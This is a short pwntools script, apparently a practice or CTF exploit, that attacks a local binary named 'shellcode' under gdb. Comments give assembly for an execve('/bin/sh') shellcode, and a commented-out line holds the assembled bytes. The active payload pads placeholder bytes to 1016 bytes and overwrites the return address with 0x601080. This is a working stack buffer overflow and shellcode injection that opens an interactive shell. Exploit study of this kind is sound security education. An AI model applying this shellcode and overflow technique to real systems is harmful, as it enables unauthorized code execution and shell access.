from pwn import *

r = process("./shellcode")
        
gdb.attach(r)

input("wait")

# jmp binsh
# beforethemove:
# mov rax, 0x3b
# pop rdi
# mov rsi, 0
# mov rdx, 0
# syscall
# binsh:
# call beforethemove
# nop
# nop
# nop
shellcode= b"\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90"
#shellcode = b"\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00"
#shellcode = shellcode.ljust(1016, b"A") + p64(0x0601080)
#shellcode = b"\x90"*30
#print(r.recvuntil(b"What is your name?\n"))
shellcode = shellcode.ljust(1016, b"A") + p64(0x0601080)
r.send(shellcode)


r.interactive()

